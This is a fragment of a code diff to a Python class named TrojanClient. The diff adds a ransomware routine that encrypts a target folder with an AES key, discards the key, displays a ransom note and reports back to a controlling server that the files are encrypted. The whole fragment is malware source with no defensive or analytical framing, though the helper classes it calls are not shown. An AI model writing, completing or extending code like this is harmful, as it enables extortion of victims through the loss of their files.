@@ -165,7 +165,11 @@ class TrojanClient:
         
         sys.exit()
         
-    def encryption(self):
+    def encryption(self, aes_key):
+        FileEncryptor.encrypt_folder(self.folder, aes_key)
+        del aes_key
+        RansomNote.display_encryption_note()
+        protocol.send(self.connection, "the files are encrypted")
 
 
 
